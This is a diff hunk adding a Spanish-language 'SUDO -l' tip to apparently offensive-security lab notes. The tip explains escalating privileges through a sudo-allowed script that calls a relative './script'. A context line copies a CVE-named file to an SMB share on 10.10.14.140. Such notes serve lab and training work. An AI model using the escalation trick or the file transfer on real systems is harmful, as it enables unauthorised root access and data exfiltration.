@@ -4553,7 +4553,9 @@ copy "C:\Users\sam.emerson\Documents\CVE-2023-28252_Summary.pdf" \\10.10.14.140\
 
 ```
 
+## SUDO -l
 
+Si tienes un script que se ejecuta con sudo y esta en sudo -l y dentro tiene ./script desde donde tu ejecutes ese comando va a tomar el script tenlo en mente para escalar privilegios.
 
 # Referencias
 
